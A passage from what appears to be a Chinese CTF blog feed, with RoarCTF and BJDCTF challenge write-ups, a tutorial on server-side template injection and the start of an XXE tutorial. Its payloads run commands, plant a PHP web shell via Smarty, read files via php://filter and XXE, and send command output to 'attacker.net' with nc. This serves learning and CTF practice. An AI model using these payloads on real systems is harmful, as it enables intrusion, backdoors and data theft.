class="number">34</span>个where加上<span class="string">";&#125;s:5:"</span>photo<span class="string">";s:10:"</span>config.php<span class="string">";&#125;一共204个字符，在filter方法里34个where会被hacker替代，34个hacker就有204个字符此时，"</span>;&#125;s:<span class="number">5</span>:<span class="string">"photo"</span>;s:<span class="number">10</span>:<span class="string">"config.php"</span>;&#125;不再是一大串where的一部分，s:<span class="number">5</span>:<span class="string">"photo"</span>;s:<span class="number">10</span>:<span class="string">"config.php"</span>也不是简单的字符串了，在序列化时会被解析成profile[<span class="string">'photo'</span>]=<span class="string">'config.php'</span></span><br></pre></td></tr></table></figure><p>下面就是注册登录更新信息，在profile.php中拿到base64码，解密拿到flag</p>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RoarCTF</title>
      <link href="/2020/02/19/RoarCTF/"/>
      <url>/2020/02/19/RoarCTF/</url>
      
        <content type="html"><![CDATA[<h4 id="1-Easy-Java"><a href="#1-Easy-Java" class="headerlink" title="1.Easy Java"></a>1.Easy Java<a id="more"></a></h4><p>打开题目出现的是一个登录界面</p><img src="/2020/02/19/RoarCTF/java.png" class=""><p>点击help出现了提示:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.io.FileNotFoundException:&#123;help.docx&#125;</span><br></pre></td></tr></table></figure><p>用burp抓包,但是怎么改都无法下载或者打开help.docx，后面尝试把GET改成了POST，成功打开了这个文件</p><p>由于题目是跟java有关系，就去百度了，找到了一篇很详细的文章，这里是重点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">WEB-INF&#x2F;web.xml泄露</span><br><span class="line">WEB-INF是Java的WEB应用的安全目录。如果想在页面中直接访问其中的文件，必须通过web.xml文件对要访问的文件进行相应映射才能访问。</span><br><span class="line">&#x2F;WEB-INF&#x2F;web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。</span><br><span class="line">&#x2F;WEB-INF&#x2F;classes&#x2F;：含了站点所有用的 class 文件，包括 servlet class 和非servlet class，他们不能包含在 .jar文件中 </span><br><span class="line">&#x2F;WEB-INF&#x2F;lib&#x2F;：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件</span><br><span class="line">&#x2F;WEB-INF&#x2F;src&#x2F;：源码目录，按照包名结构放置各个java文件。</span><br><span class="line">&#x2F;WEB-INF&#x2F;database.properties：数据库配置文件</span><br></pre></td></tr></table></figure><p>尝试WEB-INF/web.xml找到了疑似flag文件的东西…</p><img src="/2020/02/19/RoarCTF/java1.png" class=""><p>可以看到有一个com.wm.ctf.FlagController</p><p>构造payload:<code>WEB-INF/classes/com/wm.ctf.FlagController.class</code></p><img src="/2020/02/19/RoarCTF/java2.png" class=""><p>可以看到一串base64编码的字符,解码即可得到flag.</p><h4 id="2-Easy-Calc"><a href="#2-Easy-Calc" class="headerlink" title="2.Easy Calc"></a>2.Easy Calc</h4><p>是一道计算器的题，直接看网页源码找到了一个叫calc.php的文件，可以访问</p><img src="/2020/02/19/RoarCTF/calc.png" class=""><p>可以看出payload中不能包含’ ‘, ‘\t’, ‘\r’, ‘\n’,’’’, ‘“‘, ‘`’, ‘[‘, ‘]’ 等字符,而且前面有提示说加上了WAF,这道题我们可以用%20来进行绕过WAF</p><p>接下来的内容是刚刚从一篇博客学到的新知识，在这之前并不知道(我太菜了…)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php的文件操作函数：</span><br><span class="line">getcwd — 取得当前工作目录</span><br><span class="line">dirname(string $path) — 返回 path 的父目录</span><br><span class="line">scandir — 列出指定路径中的文件和目录</span><br></pre></td></tr></table></figure><p>有了上面的这些操作函数,那么就看可以找flag了…</p><p>一层层往上找</p><img src="/2020/02/19/RoarCTF/java3.png" class=""><p>在这里找到了f1agg的文件,但是/是被过滤的,这里不能直接用<code>var_dump(file_get_contents(&#39;/f1agg&#39;));</code></p><p>想到了用ascii码来进行绕过,用’.’来进行拼接</p><p>payload：<code>var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))；</code></p><p>顺利拿到flag</p>]]></content>
      
      
      
        <tags>
            
            <tag> something import </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>服务端模板注入</title>
      <link href="/2020/02/12/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/"/>
      <url>/2020/02/12/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h4 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01:简介"></a>0x01:简介<a id="more"></a></h4><p>模板引擎用于使用动态数据呈现内容。此上下文数据通常由用户控制并由模板进行格式化，以生成网页、电子邮件等。模板引擎通过使用代码构造（如条件语句、循环等）处理上下文数据，允许在模板中使用强大的语言表达式，以呈现动态内容。如果攻击者能够控制要呈现的模板，则他们将能够注入可暴露上下文数据，甚至在服务器上运行任意命令的表达式。</p><h4 id="0x02-服务端模板引擎"><a href="#0x02-服务端模板引擎" class="headerlink" title="0x02:服务端模板引擎"></a>0x02:服务端模板引擎</h4><p><strong>PHP</strong>：Smarty、Twig；</p><p><strong>Java</strong>：Freemarker、Velocity；</p><p><strong>Python</strong>：Jinja2、Tornado、Marko；</p><p><strong>Ruby</strong>：Slim、ERB；</p><p><strong>NodeJS</strong>：Jade等</p><h4 id="0x03：注入手法（ps-这是一张找来的图片）"><a href="#0x03：注入手法（ps-这是一张找来的图片）" class="headerlink" title="0x03：注入手法（ps:这是一张找来的图片）"></a>0x03：注入手法（ps:这是一张找来的图片）</h4><p> 对于模板注入漏洞的研究可以参考SQL注入，客户端的模板注入（CSTI）只能XSS，而服务端模板注入（SSTI）则可能造成XSS、LFI和任意代码执行。</p><p> 漏洞发现及利用步骤分为：探测、判断、利用（读取、探索、攻击）</p><img src="/2020/02/12/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/1.jpg" class=""><h4 id="0x04：判断漏洞"><a href="#0x04：判断漏洞" class="headerlink" title="0x04：判断漏洞"></a>0x04：判断漏洞</h4><img src="/2020/02/12/%E6%9C%8D%E5%8A%A1%E7%AB%AF%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/2.jpeg" class=""><p>通过图片中的payload可以快速判断</p><p>绿线表示成功，红线失败。49会在 Twig 中返回49，而在 Jinja2 中则是7777777</p><h4 id="1x01：收集到的一些模板注入payload-具体的模板可以自行百度了解"><a href="#1x01：收集到的一些模板注入payload-具体的模板可以自行百度了解" class="headerlink" title="1x01：收集到的一些模板注入payload,具体的模板可以自行百度了解"></a>1x01：收集到的一些模板注入payload,具体的模板可以自行百度了解</h4><p>FreeMaker：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload:&lt;#assign ex&#x3D;&quot;freemarker.template.utility.Execute&quot;?new()&gt; $&#123; ex(&quot;id&quot;) &#125;</span><br><span class="line">return:uid&#x3D;119(tomcat7) gid&#x3D;127(tomcat7) groups&#x3D;127(tomcat7)</span><br></pre></td></tr></table></figure><p>Velocity:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#set($str&#x3D;$class.inspect(&quot;java.lang.String&quot;).type)</span><br><span class="line">#set($chr&#x3D;$class.inspect(&quot;java.lang.Character&quot;).type)</span><br><span class="line">#set($ex&#x3D;$class.inspect(&quot;java.lang.Runtime&quot;).type.getRuntime().exec(&quot;whoami&quot;))</span><br><span class="line">$ex.waitFor()</span><br><span class="line">#set($out&#x3D;$ex.getInputStream())</span><br><span class="line">#foreach($i in [1..$out.available()])</span><br><span class="line">$str.valueOf($chr.toChars($out.read()))</span><br><span class="line">#end</span><br><span class="line">&#x2F;&#x2F;输出 tomcat7</span><br></pre></td></tr></table></figure><p>Smarty:</p><p>1)写文件创建后门:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,&quot;&lt;?php passthru($_GET[&#39;cmd&#39;]); ?&gt;&quot;,self::clearConfig())&#125;</span><br></pre></td></tr></table></figure><p>2)任意读取文件:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;self::getStreamVariable(&quot;file:&#x2F;&#x2F;&#x2F;proc&#x2F;self&#x2F;loginuid&quot;)&#125;</span><br></pre></td></tr></table></figure><p>Twig:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;</span><br><span class="line"> </span><br><span class="line">&#x2F;&#x2F;返回结果： uid&#x3D;1000(k) gid&#x3D;1000(k) groups&#x3D;1000(k),10(wheel)</span><br></pre></td></tr></table></figure><p>jade:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var x &#x3D; root.process</span><br><span class="line">x &#x3D; x.mainModule.require</span><br><span class="line">x &#x3D; x(&#39;child_process&#39;)</span><br><span class="line">x.exec(&#39;id | nc attacker.net 80&#39;)</span><br></pre></td></tr></table></figure><p>python模板注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1）</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ &#x3D;&#x3D; &#39;catch_warnings&#39; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;  </span><br><span class="line">  &#123;% if b.__class__ &#x3D;&#x3D; &#123;&#125;.__class__ %&#125;         &#x2F;&#x2F;遍历基类 找到eval函数</span><br><span class="line">    &#123;% if &#39;eval&#39; in b.keys() %&#125;    &#x2F;&#x2F;找到了</span><br><span class="line">      &#123;&#123; b[&#39;eval&#39;](&#39;__import__(&quot;os&quot;).popen(&quot;ls&quot;).read()&#39;) &#125;&#125;  &#x2F;&#x2F;导入cmd 执行popen里的命令 read读出数据</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br><span class="line">2）</span><br><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__&#x3D;&#x3D;&#39;catch_warnings&#39; %&#125;&#123;&#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;ls &#x2F;&#39;).read()&quot;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><p>一些补充：</p><h3 id="flask的变量和函数"><a href="#flask的变量和函数" class="headerlink" title="flask的变量和函数"></a>flask的变量和函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">flask 中有内置的的变量函数 ，那些特殊的变量可以实现某些功能</span><br><span class="line"></span><br><span class="line">config ：可以从模板中直接访问Flask当前的config对象：&#123;&#123;config.SQLALCHEMY_DATABASE_URL&#125;&#125;</span><br><span class="line"></span><br><span class="line">request : 就是flask中代表当前请求的request对象 ， &#123;&#123;request.url&#125;&#125;</span><br><span class="line"></span><br><span class="line">session :为Flask的session对象 ,&#123;&#123;session.new&#125;&#125; True</span><br><span class="line"></span><br><span class="line">g变量：在视图函数中设置g变量的那么属性的值，然后再模板中直接可以取出&#123;&#123;g.name&#125;&#125;</span><br><span class="line"></span><br><span class="line">url_for() : url_for会根据传入的路由器函数名，返回该路由的URL，在模板中始终使用url_for（）就可以安全的修改路由绑定的URL，则不必担心模板中渲染错的连接，&#123;&#123;url_for(&#39;home&#39;)&#125;&#125; ，如果我们定义的路由URL是带有参数的，则可以把他们作为关键字参数传入url_for（），Flask会把他们填充进最终生成的URL中，&#123;&#123;url_for(&#39;post&#39;,post_id&#x3D;1)&#125;&#125;</span><br><span class="line"></span><br><span class="line">get_flashed_messages():这个函数会返回之前在flask中通过flask（）传入的消息的列表，flash函数的作用很简单，可以把由Python字符串表示的信息加入一个消息队列中，在使get_flashed_message()函数取出他们并消费掉</span><br><span class="line"></span><br><span class="line">&#123;%for message in get_flashed_messages()%&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123;message&#125;&#125;</span><br><span class="line"></span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 模板注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BJDCTFwp</title>
      <link href="/2020/01/17/BJDCTFwp/"/>
      <url>/2020/01/17/BJDCTFwp/</url>
      
        <content type="html"><![CDATA[<p>Misc</p><ol><li>签个到？<a id="more"></a></li></ol><p>文件下载下来是个压缩包，解压缩发现里面还有一个压缩包，直接解压提示文件损坏解压失败</p><img src="/2020/01/17/BJDCTFwp/%E7%AD%BE%E4%B8%AA%E5%88%B0.png" class=""><p>不假思索，直接丢到kali里面，foremost一下，分离出了一张图片，打开是二维码，扫一扫，拿到Flag</p><img src="/2020/01/17/BJDCTFwp/%E7%AD%BE%E4%B8%AA%E5%88%B01.png" class=""><ol start="2"><li>你猜我是个啥？</li></ol><p>下载过来是一个压缩包，发现打不开，想到可能是文件后缀的问题，丢到winhex里面发现了是png图片，正想要改后缀的时候，把winhex直接拉到底发现了Flag</p><img src="/2020/01/17/BJDCTFwp/cai.png" class=""><ol start="3"><li>鸡你太美</li></ol><p>压缩包解压，一个是gif，一个是它的副本，把gif文件丢到winhex里面，没有发现什么有用的东西。本着试试的想法，把副本丢到winhex里面，发现最开头有9a，再想到前面的是gif文件，gif文件头刚好是GIF89a，把文件头补全重新保存为GIF文件，Flag出来了。</p><img src="/2020/01/17/BJDCTFwp/%E9%B8%A1%E5%A4%AA%E7%BE%8E.png" class=""><ol start="4"><li>just a rar</li></ol><p>下载下来是一个压缩包，里面有一个四位数.rar的文件，直接上工具进行爆破.</p><img src="/2020/01/17/BJDCTFwp/rar.png" class=""><p>密码是2016，打开解压缩得到一张图片，放到winhex里面什么东西都没有，放到kali里，binwalk，foremost都没有什么东西</p><p>突然想到以前做过的一道题，打开属性，在备注里找到了flag</p><img src="/2020/01/17/BJDCTFwp/rar1.png" class=""><p>Crypto</p><ol><li>sign in</li></ol><p>打开是这样的<img src="/2020/01/17/BJDCTFwp/signin1.png" class=""></p><p>把base16，64，32挨个试一下，是base16加密</p><p>找一个线解密网站</p><img src="/2020/01/17/BJDCTFwp/signin.png" class=""><ol start="2"><li>编制与调制</li></ol><p>打开下载文件得到一个txt文件和一个带hint的图片，根据hint的图片猜测是曼彻斯特加密</p><p>网上搜到了一个脚本，拿过来跑一下就出来了</p><img src="/2020/01/17/BJDCTFwp/%E7%BC%96%E5%88%B6.png" class=""><ol start="3"><li>Polybius</li></ol><p>打开文件</p><img src="/2020/01/17/BJDCTFwp/polybius.png" class=""><p>Hintbase64解密得到提示明文是16位数字</p><p>百度了一下找到了对应的棋盘加密，不过棋盘有改动，想到flag大多是一句话，那就一个个试</p><img src="/2020/01/17/BJDCTFwp/%E6%A3%8B%E7%9B%98.jpg" class=""><p>手动对应解密，得到flag：BJD{flagispolybius}</p><p>4.EASYRSA</p><img src="/2020/01/17/BJDCTFwp/RSA1.png" class=""><p>打开拿到的一段代码，上网搜了一下有关RSA加密的知识，再找了一个可攻击的脚本来进行反解先得到p和q，再来解m的值，最后long_to_bytes(m)就可以得到flag了</p><img src="/2020/01/17/BJDCTFwp/rsa.png" class=""><p>Web</p><p>1.Hello World</p><p>打开题目地址，点击sketch included，就是界面开始的那个，出现文字注意你的id，用burp suite抓包，根据放出来的hint是id与admin有关</p><p>同时在burp中看到id的格式，在请求头中添加id:admin+base64(admin),send一下，返回如下</p><img src="/2020/01/17/BJDCTFwp/hello4.png" class=""><p>X-Forwarded-For:127.0.0.1</p><img src="/2020/01/17/BJDCTFwp/hello1.png" class=""><p>Referer:<a href="https://google.com" target="_blank" rel="noopener">https://google.com</a></p><img src="/2020/01/17/BJDCTFwp/hello2.png" class=""><p>2.easy_upload</p><p>上传一句话木马，以jpg格式上传，访问提示给的地址</p><img src="/2020/01/17/BJDCTFwp/upload2.png" class=""><p>参考了一篇博客，学到了直接读取文件中的内容</p><img src="/2020/01/17/BJDCTFwp/upload.png" class=""><p>3.Hidden serects</p><p>抓一下包，可以发现有一段password</p><img src="/2020/01/17/BJDCTFwp/hidden.png" class=""><p>通过尝试发现是md5加密</p><p>解密登录网站</p><p>打开发现还是没什么东西，F12和ctrl键都不能用</p><p>这里我用了一个插件叫restclient,找到flag</p><img src="/2020/01/17/BJDCTFwp/hidden1.png" class=""><p>4.easy md5</p><p>抓一下包，在反应头里有一个hint</p><img src="/2020/01/17/BJDCTFwp/MD51.png" class=""><p>根据树哥的一篇md5博客照着写</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[https:&#x2F;&#x2F;largepoplar.xyz&#x2F;2019&#x2F;12&#x2F;27&#x2F;MD5%E7%9A%84%E4%B8%80%E7%B3%BB%E5%88%97%E9%97%AE%E9%A2%98&#x2F;](https:&#x2F;&#x2F;largepoplar.xyz&#x2F;2019&#x2F;12&#x2F;27&#x2F;MD5的一系列问题&#x2F;)</span><br></pre></td></tr></table></figure><p>先提交ffifdyop，查看页面源码</p><img src="/2020/01/17/BJDCTFwp/MD52.png" class=""><p>发现是md5弱比较</p><p>构造payload?a=QNKCDZO&amp;b=aabg7XSs，得到</p><img src="/2020/01/17/BJDCTFwp/MD53.png" class="" title="}强比较，没有规定字符串如果这个时候传入的是数组不是字符串，md5（）函数无法解出其数值并且不会报错，就会得到数值相等 {%asset_img md54.png"><p>5.Mark loves cat</p><p>打开题目地址，没发现什么</p><p>用敏感目录扫描工具 syc-scan</p><p>python3 syc.py <a href="http://222.186.56.247:8105/" target="_blank" rel="noopener">http://222.186.56.247:8105/</a></p><p>发现存在git泄露</p><p>用git_extract 工具进行恢复</p><p>python git_extract.py <a href="http://222.186.56.247:8105/.git/" target="_blank" rel="noopener">http://222.186.56.247:8105/.git/</a></p><p>在目录下生成了一个新的文件，打开是</p><img src="/2020/01/17/BJDCTFwp/mark.png" class=""><p>要绕过这三个条件才能得到flag</p><p>构造payload：?arc=flag&amp;flag=arc&amp;_GET=ntr post请求:_POST[flag]=fuck</p><img src="/2020/01/17/BJDCTFwp/mark2.png" class=""><ol start="6"><li>这序列化也太简单了吧</li></ol><p>是一道反序列化题</p><p>在网上找了好多博客研究了半天，搞懂了一点一点</p><img src="/2020/01/17/BJDCTFwp/se1.png" class=""><p>把传入的序列化字符串的属性个数更改成大于 1 的任何数来绕过_wakeup()</p><img src="/2020/01/17/BJDCTFwp/se.png" class=""><p>7.zjctf</p><p>通过text=data://text/plain;base64,SSBoYXZlIGEgZHJlYW0=写入那句话,再用file=php://filter/read=convert.base64-encode/resource=next.php以base64的方式读取文件，base64解密得到next.php文件</p><img src="/2020/01/17/BJDCTFwp/zjctf1.png" class=""><p>通过测试/next.php?\S*=${getFlag()}&amp;cmd=system(“cd ../../../;ls”)发现根目录下有flag</p><p>构造payload：/next.php?\S*=${getFlag()}&amp;cmd=system(“cat /flag”)</p><img src="/2020/01/17/BJDCTFwp/zjctf.png" class=""><p>8.The_mystery_of_ip</p><p>点击flag出现了ip，抓包</p><p>猜测可能是smarty模板注入，改一下x-forwarded-for:{if phpindfo()}{/if}</p><img src="/2020/01/17/BJDCTFwp/ip1.png" class=""><p>底下成功显示了phpinfo的页面</p><p>修改x-forwarded-for的值查询列表：X-Forwarded-For: {if system(‘ls’)}{/if}</p><p>可以发现出现了当前目录下的文件</p><p>X-Forwarded-For: {if system(“cd ../../../;ls”)}{/if}向上层文件遍历目录</p><img src="/2020/01/17/BJDCTFwp/ip2.png" class=""><p>发现了flag文件，接下来就是读取X-Forwarded-For: {if system(“cat /flag”)}{/if}</p><img src="/2020/01/17/BJDCTFwp/ip3.png" class=""><p>9.easy_search</p><p>根据hint是vim泄漏，<a href="http://222.186.56.247:8107/index.php.swp可以看到源码，根据源码得出登录密码为2020666" target="_blank" rel="noopener">http://222.186.56.247:8107/index.php.swp可以看到源码，根据源码得出登录密码为2020666</a></p><p>账号随便输一个，写上密码，burp抓包</p><p>看到有一个url_is_here</p><p>猜测是ssi注入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;&lt;!--#exec cmd&#x3D;&quot;ls&quot; --&gt;&amp;password&#x3D;2020666</span><br></pre></td></tr></table></figure><img src="/2020/01/17/BJDCTFwp/easy_search.png" class=""><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;&lt;!--#exec cmd&#x3D;&quot;ls ..&#x2F;&quot; --&gt;&amp;password&#x3D;2020666</span><br></pre></td></tr></table></figure><img src="/2020/01/17/BJDCTFwp/easysearch2.png" class=""><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username&#x3D;&lt;!--#execcmd&#x3D;&quot;cat..&#x2F;flag_990c66bf85a09c664f0b6741840499b2&quot; --&gt;&amp;password&#x3D;2020666</span><br></pre></td></tr></table></figure><img src="/2020/01/17/BJDCTFwp/search3.png" class="">]]></content>
      
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XXE漏洞</title>
      <link href="/2020/01/16/XXE%E6%BC%8F%E6%B4%9E/"/>
      <url>/2020/01/16/XXE%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h4 id="1-什么是XXE漏洞"><a href="#1-什么是XXE漏洞" class="headerlink" title="1.什么是XXE漏洞"></a>1.什么是XXE漏洞<a id="more"></a></h4><p>XXE漏洞全称为XML External Entity Injection 即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害</p><p>DTD:文档类型定义</p><p>DTD实体<br>DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。</p><p>实体又分为一般实体和参数实体<br>1，一般实体的声明语法:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名 &quot;实体内容&quot;&gt;</span><br></pre></td></tr></table></figure><p>引用实体的方式：&amp;实体名；<br>2，参数实体只能在DTD中使用，参数实体的声明格式： <code>&lt;!ENTITY % 实体名 &quot;实体内容&quot;&gt;</code><br>引用实体的方式：%实体名；</p><p>1，内部实体声明:<code>&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt; ex:&lt;!ENTITY eviltest &quot;eviltest&quot;&gt;</code></p><p>  注意和DTD中的元素声明区别</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 声明元素&gt;</span><br></pre></td></tr></table></figure><p><strong>2，外部实体声明:</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URL&quot;&gt;</span><br></pre></td></tr></table></figure><h2 id="XXE的攻击与危害（XML-External-Entity）"><a href="#XXE的攻击与危害（XML-External-Entity）" class="headerlink" title="XXE的攻击与危害（XML External Entity）"></a>XXE的攻击与危害（XML External Entity）</h2><h4 id="1，何为XXE"><a href="#1，何为XXE" class="headerlink" title="1，何为XXE?"></a>1，何为XXE?</h4><p>答： xxe也就是xml外部实体注入。也就是上文中加粗的那一部分。</p><h4 id="2，怎样构建外部实体注入？"><a href="#2，怎样构建外部实体注入？" class="headerlink" title="2，怎样构建外部实体注入？"></a>2，怎样构建外部实体注入？</h4><p>方式一：直接通过DTD外部实体声明<br>XML内容</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY b <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///etc/passwd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">c</span>&gt;</span><span class="symbol">&amp;b;</span><span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br></pre></td></tr></table></figure><p>方式二：通过DTD文档引入外部DTD文档，再引入外部实体声明<br>XML内容：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE a <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://mark4z5.com/evil.dtd"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">c</span>&gt;</span><span class="symbol">&amp;B;</span><span class="tag">&lt;/<span class="name">c</span>&gt;</span></span><br></pre></td></tr></table></figure><p>DTD文件内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY b SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br></pre></td></tr></table></figure><p>方式三：通过DTD外部实体声明引入外部实体声明<br>好像有点拗口，其实意思就是先写一个外部实体声明，然后引用的是在攻击者服务器上面的外部实体声明<br>具体看例子,XML内容</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">&lt;!ENTITY % d SYSTEM &quot;http:&#x2F;&#x2F;mark4z5.com&#x2F;evil.dtd&quot;&gt;</span><br><span class="line">%d;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;c&gt;&amp;b;&lt;&#x2F;c&gt;</span><br></pre></td></tr></table></figure><p>dtd文件内容：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY b <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///etc/passwd"</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="产生哪些危害？"><a href="#产生哪些危害？" class="headerlink" title="产生哪些危害？"></a>产生哪些危害？</h4><p>XXE危害1：读取任意文件</p><p><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729145026738-1407663000.png" alt="img"></p><p><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729145035082-1171815922.png" alt="img"></p><p>该CASE是读取/etc/passwd，有些XML解析库支持列目录，攻击者通过列目录、读文件，获取帐号密码后进一步攻击，如读取tomcat-users.xml得到帐号密码后登录tomcat的manager部署webshell。</p><p>另外，数据不回显就没有问题了吗？如下图</p><p><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729145050972-1215502458.png" alt="img"></p><p>不，可以把数据发送到远程服务器</p><p><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729145104285-1507820174.png" alt="img"></p><p>远程evil.dtd文件内容如下</p><p><img src="https://images2017.cnblogs.com/blog/1205477/201707/1205477-20170729145111863-976147511.png" 